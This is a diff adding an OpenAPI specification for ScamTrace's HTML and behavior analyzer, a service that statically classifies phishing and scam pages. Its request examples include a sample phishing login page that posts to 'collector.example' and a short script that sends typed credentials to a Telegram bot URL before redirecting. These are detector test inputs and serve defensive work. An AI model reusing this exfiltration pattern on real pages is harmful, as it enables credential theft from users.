@@ -1,0 +1,5755 @@
+{
+  "openapi": "3.1.0",
+  "info": {
+    "title": "C2 HTML Content & Behavior Analyzer",
+    "description": "Component C2 of ScamTrace. Never runs page JavaScript; only `POST /api/v1/analyze` in url mode fetches a page (static, SSRF-guarded). Environment: **production**.",
+    "version": "0.1.0"
+  },
+  "paths": {
+    "/health": {
+      "get": {
+        "tags": [
+          "health"
+        ],
+        "summary": "Health",
+        "description": "Liveness probe.",
+        "operationId": "health_health_get",
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "additionalProperties": {
+                    "type": "string"
+                  },
+                  "type": "object",
+                  "title": "Response Health Health Get"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/ready": {
+      "get": {
+        "tags": [
+          "health"
+        ],
+        "summary": "Ready",
+        "description": "Readiness probe: 200 once every model is loaded (with versions), else 503.",
+        "operationId": "ready_ready_get",
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/ReadyResponse"
+                }
+              }
+            }
+          },
+          "503": {
+            "description": "models still loading or not usable"
+          }
+        }
+      }
+    },
+    "/api/v1/preprocess": {
+      "post": {
+        "tags": [
+          "preprocessing (Part 2)"
+        ],
+        "summary": "HTML -> ParsedPage (Part 2 facts, no verdict)",
+        "description": "Run the Part 2 pipeline on one HTML string.\n\nExtracts and organizes (text, forms, links, scripts as text, DOM summary);\nit never runs JavaScript and never downloads anything. The JSON is exactly\nwhat ``preprocess_html.py`` stores for dataset samples (same aliases).",
+        "operationId": "preprocess_api_v1_preprocess_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/PreprocessRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/ParsedPage"
+                }
+              }
+            }
+          },
+          "413": {
+            "description": "request body larger than 5 MB"
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/dom-features": {
+      "post": {
+        "tags": [
+          "DOM features (Part 3)"
+        ],
+        "summary": "HTML -> DOM security feature vector + evidence (Part 3, no verdict)",
+        "description": "Run Part 2 then Part 3 on one HTML string.\n\nReturns the fixed-order feature vector (``features``, order of\nconfigs/dom_features.yaml) and human-readable ``evidence``. Without ``url``\nthe internal/external features are 0 and ``base_url_known`` is 0. Same\ncode as ``extract_dom_features.py`` - the numbers match the training CSV.",
+        "operationId": "dom_features_api_v1_dom_features_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/PreprocessRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/DomResult"
+                }
+              }
+            }
+          },
+          "413": {
+            "description": "request body larger than 5 MB"
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/js-analysis": {
+      "post": {
+        "tags": [
+          "JS analysis (Part 7)"
+        ],
+        "summary": "HTML -> static JavaScript detections + feature vector (Part 7, no verdict)",
+        "description": "Run Part 2 then Part 7 on one HTML string.\n\nParses every inline script, event handler and javascript: URL with\ntree-sitter (never executes anything) and reports API usage with line\nnumbers, arguments and PII-masked snippets, plus the js_v1 feature vector.\nExternal ``<script src>`` files are NOT downloaded (reference only). Same\ncode as ``analyze_js.py`` - the numbers match the dataset CSV.",
+        "operationId": "js_analysis_api_v1_js_analysis_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/JsAnalysisRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/JsAnalysisResult"
+                }
+              }
+            }
+          },
+          "413": {
+            "description": "request body larger than 5 MB"
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/behavior": {
+      "post": {
+        "tags": [
+          "Behavioral intent (Part 8)"
+        ],
+        "summary": "HTML -> sources, sinks, flows and behavioral patterns with evidence (Part 8)",
+        "description": "Run Part 2, Part 7 and Part 8 on one HTML string.\n\nLinks sensitive SOURCES (credential fields, keystrokes, cookies, clipboard\n...) to SINKS (external requests, redirects, clipboard writes, eval ...)\nwith a lightweight static taint analysis and reports the behavioral\npatterns (credential exfiltration, forced redirect, ClickFix, suspicious\ndownload, obfuscated execution ...) with severity, a plain-English message\nand the evidence chain (source line -> assignments -> sink line). Nothing\nis executed or downloaded. Same code as ``map_behavior.py``.",
+        "operationId": "behavior_api_v1_behavior_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/BehaviorRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/BehaviorResult"
+                }
+              }
+            }
+          },
+          "413": {
+            "description": "request body larger than 5 MB"
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/content": {
+      "post": {
+        "tags": [
+          "Content (Part 5)"
+        ],
+        "summary": "HTML -> text segments, languages and model-ready page_text (Part 5, no verdict)",
+        "description": "Run Part 2 then Part 5 on one HTML string.\n\nSplits the page text into segments (title, headings, CTAs, form labels,\nalert banners, paragraphs ...) with a language per segment and per page\n(en / si / ta / si_latn / ta_latn / mixed / other / unknown, confidence and\nmethod), masks emails / phones / NIC / card numbers, and builds the\n``page_text`` string Part 6 reads. Nothing is classified here. Same code as\n``build_text_corpus.py``.",
+        "operationId": "content_api_v1_content_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/ContentRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/PageText"
+                }
+              }
+            }
+          },
+          "413": {
+            "description": "request body larger than 5 MB"
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/text-prediction": {
+      "post": {
+        "tags": [
+          "Text model (Part 6)"
+        ],
+        "summary": "HTML -> Part 5A page_text -> XLM-R + TF-IDF class probabilities (Part 6A)",
+        "description": "Run Part 2 -> Part 5A -> Part 6A on one HTML string.\n\nReturns, per text model (fine-tuned XLM-R, TF-IDF baseline), the predicted\nthreat class and the probability of every class. A model that is not trained /\nimported yet answers ``available: false`` with \"model not available: ...\" - the\nrequest still succeeds. The text-only arm of the ablation: no DOM or JS signal.",
+        "operationId": "text_prediction_api_v1_text_prediction_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/ContentRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/TextPrediction"
+                }
+              }
+            }
+          },
+          "413": {
+            "description": "request body larger than 5 MB"
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/analyze": {
+      "post": {
+        "tags": [
+          "analysis (Part 9)"
+        ],
+        "summary": "URL or HTML -> verdict, threat class, risk score, findings (schema c2.analysis.v1)",
+        "description": "Analyze a page end to end (Part 9 B-1).\n\n- ``{\"url\": ...}``: C2 fetches the page itself, statically and safely (no JS, no\n  sub-resources, private / internal addresses refused, 5 MB / 5 redirects / timeout).\n- ``{\"html\": ..., \"url\"?: ...}``: analyze this HTML (paste / test mode, no fetch).\n\nThen Part 2 -> 3 -> 5A -> 6A -> 7 -> 8 -> the 9A fusion model -> verdict tiers +\nevidence floor. ``status`` says whether a verdict was possible (ok / inconclusive /\nunreachable / error); a failing model arm only sets ``degraded``. Repeated url checks\nwithin the cache TTL answer from memory with ``cached: true``.\n\nEvery answered check is also stored in the scan history (Part 9 B-2, source = the\nrequest's ``source``); a storage problem is logged and never fails the analysis.",
+        "operationId": "analyze_api_v1_analyze_post",
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/AnalysisRequest"
+              }
+            }
+          },
+          "required": true
+        },
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/AnalysisResponse"
+                }
+              }
+            }
+          },
+          "413": {
+            "description": "html larger than 5 MB (or request body larger than 5 MB)"
+          },
+          "415": {
+            "description": "body is not application/json"
+          },
+          "422": {
+            "description": "invalid input (no url / html, url not http(s), > 2,048 chars)"
+          },
+          "429": {
+            "description": "rate limit per client exceeded (Retry-After header)"
+          },
+          "503": {
+            "description": "models could not be loaded (see GET /ready)"
+          },
+          "504": {
+            "description": "time budget exceeded - body = the partial AnalysisResponse"
+          }
+        }
+      }
+    },
+    "/analyze-html": {
+      "post": {
+        "tags": [
+          "analysis (Part 9)"
+        ],
+        "summary": "Analyze Html Legacy",
+        "description": "Compatibility route for backend/api-gateway, which calls\n``POST {C2_URL}/analyze-html`` with ``{\"url\": ...}``.\n\nTODO (Part 9): agree with the gateway on one contract (URL vs raw HTML)\nand either fetch the page here or remove this route.",
+        "operationId": "analyze_html_legacy_analyze_html_post",
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {}
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/ingest": {
+      "post": {
+        "tags": [
+          "ingest (Part 9B-2)"
+        ],
+        "summary": "ThreatRadar pushes new URLs -> queued for background analysis (202)",
+        "description": "Queue up to 500 URLs. Invalid / allow-listed URLs are listed in ``rejected`` (the\nrest is still accepted); a URL analysed in the last 24 h or already queued counts as a\nduplicate and reuses that result. Results: ``GET /api/v1/scans`` and the live feed.",
+        "operationId": "ingest_api_v1_ingest_post",
+        "parameters": [
+          {
+            "name": "X-C2-Ingest-Key",
+            "in": "header",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "type": "string"
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "title": "X-C2-Ingest-Key"
+            }
+          }
+        ],
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/IngestRequest"
+              }
+            }
+          }
+        },
+        "responses": {
+          "202": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/IngestResponse"
+                }
+              }
+            }
+          },
+          "401": {
+            "description": "missing or invalid X-C2-Ingest-Key"
+          },
+          "415": {
+            "description": "body is not application/json"
+          },
+          "422": {
+            "description": "invalid body (no urls, more than the per-call limit)"
+          },
+          "503": {
+            "description": "ingest disabled (INGEST_API_KEY not set)"
+          }
+        }
+      }
+    },
+    "/api/v1/scans": {
+      "get": {
+        "tags": [
+          "dashboard (Part 9B-2)"
+        ],
+        "summary": "Scan history, newest first (defanged URLs, cursor pagination)",
+        "description": "Finished scans (``verdict=none`` = no verdict: unreachable / inconclusive).",
+        "operationId": "scans_api_v1_scans_get",
+        "parameters": [
+          {
+            "name": "source",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "enum": [
+                    "user",
+                    "threatradar_push",
+                    "threatradar_pull",
+                    "api"
+                  ],
+                  "type": "string"
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "title": "Source"
+            }
+          },
+          {
+            "name": "verdict",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "enum": [
+                    "Legitimate",
+                    "Suspicious",
+                    "Malicious",
+                    "none"
+                  ],
+                  "type": "string"
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "title": "Verdict"
+            }
+          },
+          {
+            "name": "threat_class",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "type": "string"
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "title": "Threat Class"
+            }
+          },
+          {
+            "name": "since",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "type": "string"
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "description": "YYYY-MM-DD or ISO 8601 (UTC)",
+              "title": "Since"
+            },
+            "description": "YYYY-MM-DD or ISO 8601 (UTC)"
+          },
+          {
+            "name": "q",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "type": "string",
+                  "maxLength": 200
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "description": "text in URL / domain",
+              "title": "Q"
+            },
+            "description": "text in URL / domain"
+          },
+          {
+            "name": "limit",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "type": "integer",
+                  "minimum": 1
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "title": "Limit"
+            }
+          },
+          {
+            "name": "cursor",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "type": "string",
+                  "pattern": "^\\d{1,18}$"
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "title": "Cursor"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/ScanList"
+                }
+              }
+            }
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/scans/{scan_id}": {
+      "get": {
+        "tags": [
+          "dashboard (Part 9B-2)"
+        ],
+        "summary": "One stored analysis (c2.analysis.v1, URLs / domains defanged)",
+        "operationId": "scan_detail_api_v1_scans__scan_id__get",
+        "parameters": [
+          {
+            "name": "scan_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "integer",
+              "title": "Scan Id"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/AnalysisResponse"
+                }
+              }
+            }
+          },
+          "404": {
+            "description": "unknown scan, or no result yet (queued / failed)"
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/stats/overview": {
+      "get": {
+        "tags": [
+          "dashboard (Part 9B-2)"
+        ],
+        "summary": "Totals by verdict / class / source / language, top domains / brands, series",
+        "operationId": "stats_overview_api_v1_stats_overview_get",
+        "parameters": [
+          {
+            "name": "window",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "enum": [
+                "24h",
+                "7d",
+                "30d"
+              ],
+              "type": "string",
+              "default": "24h",
+              "title": "Window"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/StatsOverview"
+                }
+              }
+            }
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/feed/stream": {
+      "get": {
+        "tags": [
+          "dashboard (Part 9B-2)"
+        ],
+        "summary": "Live feed: one Server-Sent Event (event: scan) per finished scan",
+        "description": "Use from the browser with ``new EventSource(\".../api/v1/feed/stream\")`` and listen\nfor ``scan`` events; data = {id, url (defanged), verdict, threat_class, risk_score,\nsource, created_at}.",
+        "operationId": "feed_stream_api_v1_feed_stream_get",
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "text/event-stream": {}
+            }
+          }
+        }
+      }
+    },
+    "/api/v1/research/summary": {
+      "get": {
+        "tags": [
+          "dashboard (Part 9B-2)"
+        ],
+        "summary": "Read-only research numbers: dataset, ablation + CIs, operating points, models",
+        "description": "Read from the reports earlier Parts wrote (nothing is recomputed).",
+        "operationId": "research_api_v1_research_summary_get",
+        "parameters": [
+          {
+            "name": "version",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "anyOf": [
+                {
+                  "type": "string",
+                  "pattern": "^v\\d+\\.\\d+$"
+                },
+                {
+                  "type": "null"
+                }
+              ],
+              "title": "Version"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful Response",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "additionalProperties": true,
+                  "title": "Response Research Api V1 Research Summary Get"
+                }
+              }
+            }
+          },
+          "422": {
+            "description": "Validation Error",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/HTTPValidationError"
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  },
+  "components": {
+    "schemas": {
+      "AnalysisFinding": {
+        "properties": {
+          "id": {
+            "type": "string",
+            "title": "Id"
+          },
+          "modality": {
+            "type": "string",
+            "enum": [
+              "dom",
+              "content",
+              "behavior",
+              "fetch",
+              "fusion"
+            ],
+            "title": "Modality"
+          },
+          "severity": {
+            "type": "string",
+            "enum": [
+              "critical",
+              "high",
+              "medium",
+              "low",
+              "info"
+            ],
+            "title": "Severity"
+          },
+          "title": {
+            "type": "string",
+            "title": "Title"
+          },
+          "detail": {
+            "type": "string",
+            "title": "Detail"
+          },
+          "evidence": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Evidence"
+          },
+          "raises_verdict": {
+            "type": "boolean",
+            "title": "Raises Verdict",
+            "default": false
+          },
+          "steps": {
+            "items": {
+              "$ref": "#/components/schemas/EvidenceStep"
+            },
+            "type": "array",
+            "title": "Steps"
+          }
+        },
+        "type": "object",
+        "required": [
+          "id",
+          "modality",
+          "severity",
+          "title",
+          "detail"
+        ],
+        "title": "AnalysisFinding",
+        "description": "One human-readable reason, ranked by severity."
+      },
+      "AnalysisInput": {
+        "properties": {
+          "mode": {
+            "type": "string",
+            "enum": [
+              "url",
+              "html"
+            ],
+            "title": "Mode"
+          },
+          "submitted_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Submitted Url"
+          },
+          "final_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Final Url"
+          },
+          "redirect_hosts": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Redirect Hosts"
+          },
+          "http_status": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Http Status"
+          },
+          "content_type": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Content Type"
+          },
+          "html_bytes": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Html Bytes"
+          }
+        },
+        "type": "object",
+        "required": [
+          "mode"
+        ],
+        "title": "AnalysisInput",
+        "description": "What was analyzed and how it was obtained."
+      },
+      "AnalysisRequest": {
+        "properties": {
+          "url": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 2048
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url",
+            "description": "page address: fetched by C2 when no html is given, otherwise only used to resolve links (never fetched)"
+          },
+          "html": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Html",
+            "description": "raw HTML (paste / test mode): skips the fetch; <= 5 MB"
+          },
+          "request_id": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 128,
+                "pattern": "^[A-Za-z0-9._:\\-]+$"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Request Id",
+            "description": "caller's id, echoed back"
+          },
+          "source": {
+            "type": "string",
+            "enum": [
+              "user",
+              "threatradar",
+              "api"
+            ],
+            "title": "Source",
+            "default": "api"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "title": "AnalysisRequest",
+        "description": "Input to ``POST /api/v1/analyze``: ``url`` (fetched by C2) OR ``html`` (+ ``url``).",
+        "examples": [
+          {
+            "request_id": "ui-42",
+            "source": "user",
+            "url": "https://example.com/"
+          },
+          {
+            "html": "<html><head><title>Verify your account</title></head><body><h1>Account suspended</h1><p>Sign in within 24 hours or your account is closed.</p><form action=\"https://collector.example/login.php\" method=\"post\"><input type=\"email\" name=\"email\"><input type=\"password\" name=\"pass\"><button>Sign in</button></form></body></html>",
+            "source": "api",
+            "url": "https://account-verify.example/login"
+          }
+        ]
+      },
+      "AnalysisResponse": {
+        "properties": {
+          "analysis_id": {
+            "type": "string",
+            "title": "Analysis Id"
+          },
+          "request_id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Request Id"
+          },
+          "schema_version": {
+            "type": "string",
+            "title": "Schema Version",
+            "default": "c2.analysis.v1"
+          },
+          "analyzed_at": {
+            "type": "string",
+            "format": "date-time",
+            "title": "Analyzed At"
+          },
+          "source": {
+            "type": "string",
+            "enum": [
+              "user",
+              "threatradar",
+              "api"
+            ],
+            "title": "Source",
+            "default": "api"
+          },
+          "cached": {
+            "type": "boolean",
+            "title": "Cached",
+            "default": false
+          },
+          "input": {
+            "$ref": "#/components/schemas/AnalysisInput"
+          },
+          "status": {
+            "type": "string",
+            "enum": [
+              "ok",
+              "inconclusive",
+              "unreachable",
+              "error"
+            ],
+            "title": "Status"
+          },
+          "status_reason": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Status Reason"
+          },
+          "verdict": {
+            "anyOf": [
+              {
+                "type": "string",
+                "enum": [
+                  "Legitimate",
+                  "Suspicious",
+                  "Malicious"
+                ]
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Verdict"
+          },
+          "threat_class": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Threat Class"
+          },
+          "risk_score": {
+            "anyOf": [
+              {
+                "type": "integer",
+                "maximum": 100.0,
+                "minimum": 0.0
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Risk Score"
+          },
+          "class_probabilities": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Class Probabilities"
+          },
+          "page_language": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Page Language"
+          },
+          "findings": {
+            "items": {
+              "$ref": "#/components/schemas/AnalysisFinding"
+            },
+            "type": "array",
+            "title": "Findings"
+          },
+          "findings_total": {
+            "type": "integer",
+            "title": "Findings Total",
+            "default": 0
+          },
+          "findings_omitted": {
+            "type": "integer",
+            "title": "Findings Omitted",
+            "default": 0
+          },
+          "modalities": {
+            "$ref": "#/components/schemas/Modalities"
+          },
+          "explanation": {
+            "$ref": "#/components/schemas/Explanation"
+          },
+          "degraded": {
+            "type": "boolean",
+            "title": "Degraded",
+            "default": false
+          },
+          "warnings": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Warnings"
+          },
+          "model_versions": {
+            "additionalProperties": {
+              "anyOf": [
+                {
+                  "type": "string"
+                },
+                {
+                  "type": "null"
+                }
+              ]
+            },
+            "type": "object",
+            "title": "Model Versions"
+          },
+          "timings_ms": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Timings Ms"
+          }
+        },
+        "type": "object",
+        "required": [
+          "analysis_id",
+          "analyzed_at",
+          "input",
+          "status",
+          "modalities"
+        ],
+        "title": "AnalysisResponse",
+        "description": "Unified tri-modal output (``c2.analysis.v1``)."
+      },
+      "ApiCount": {
+        "properties": {
+          "api": {
+            "type": "string",
+            "title": "Api"
+          },
+          "category": {
+            "type": "string",
+            "title": "Category"
+          },
+          "page_own": {
+            "type": "integer",
+            "title": "Page Own",
+            "default": 0
+          },
+          "library": {
+            "type": "integer",
+            "title": "Library",
+            "default": 0
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "api",
+          "category"
+        ],
+        "title": "ApiCount"
+      },
+      "ArmResult": {
+        "properties": {
+          "arm": {
+            "type": "string",
+            "title": "Arm"
+          },
+          "display": {
+            "type": "string",
+            "title": "Display"
+          },
+          "status": {
+            "type": "string",
+            "enum": [
+              "ok",
+              "failed",
+              "skipped"
+            ],
+            "title": "Status"
+          },
+          "reason": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Reason"
+          },
+          "predicted": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Predicted"
+          },
+          "probabilities": {
+            "anyOf": [
+              {
+                "additionalProperties": {
+                  "type": "number"
+                },
+                "type": "object"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Probabilities"
+          },
+          "fusion_weight": {
+            "anyOf": [
+              {
+                "type": "number"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Fusion Weight"
+          }
+        },
+        "type": "object",
+        "required": [
+          "arm",
+          "display",
+          "status"
+        ],
+        "title": "ArmResult",
+        "description": "One model arm (DOM-only, Behavior-only, Text TF-IDF, Text XLM-R)."
+      },
+      "BehaviorMeta": {
+        "properties": {
+          "schema_version": {
+            "type": "string",
+            "title": "Schema Version",
+            "default": "behavior_v1"
+          },
+          "sample_id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Sample Id"
+          },
+          "dataset_version": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Dataset Version"
+          },
+          "page_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Page Url"
+          },
+          "base_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Base Url"
+          },
+          "source_sha256": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Source Sha256"
+          },
+          "js_rules_hash": {
+            "type": "string",
+            "title": "Js Rules Hash"
+          },
+          "rules_hash": {
+            "type": "string",
+            "title": "Rules Hash"
+          },
+          "processing_ms": {
+            "type": "number",
+            "title": "Processing Ms",
+            "default": 0.0
+          },
+          "step_ms": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Step Ms"
+          },
+          "truncated": {
+            "type": "boolean",
+            "title": "Truncated",
+            "default": false
+          },
+          "warnings": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Warnings"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "js_rules_hash",
+          "rules_hash"
+        ],
+        "title": "BehaviorMeta"
+      },
+      "BehaviorRequest": {
+        "properties": {
+          "html": {
+            "type": "string",
+            "title": "Html",
+            "description": "the page's HTML (larger than 5 MB is truncated)"
+          },
+          "url": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 8192
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url",
+            "description": "page address, never fetched"
+          }
+        },
+        "type": "object",
+        "required": [
+          "html"
+        ],
+        "title": "BehaviorRequest",
+        "description": "Input to ``POST /api/v1/behavior`` (same fields as /preprocess).",
+        "examples": [
+          {
+            "html": "<html><head><title>Verify</title></head><body><form id=\"f\"><input type=\"email\" id=\"email\"><input type=\"password\" id=\"password\"><button>Sign in</button></form><script>var api = 'https://api.telegram.org/bot123:ABC/sendMessage';document.getElementById('f').addEventListener('submit', function (e) { e.preventDefault(); var p = document.getElementById('password').value; var u = document.getElementById('email').value; fetch(api, {method: 'POST', body: JSON.stringify({text: u + ':' + p})}); location.replace('https://www.microsoft.com/');});</script></body></html>",
+            "url": "https://account-verify.example/login"
+          },
+          {
+            "html": "<script>window.location.replace('https://offer.example/');</script>",
+            "url": "https://news.example/"
+          }
+        ]
+      },
+      "BehaviorResult": {
+        "properties": {
+          "meta": {
+            "$ref": "#/components/schemas/BehaviorMeta"
+          },
+          "feature_set_version": {
+            "type": "string",
+            "title": "Feature Set Version"
+          },
+          "summary": {
+            "$ref": "#/components/schemas/BehaviorSummary"
+          },
+          "sources_found": {
+            "items": {
+              "$ref": "#/components/schemas/SourceHit"
+            },
+            "type": "array",
+            "title": "Sources Found"
+          },
+          "sinks_found": {
+            "items": {
+              "$ref": "#/components/schemas/SinkHit"
+            },
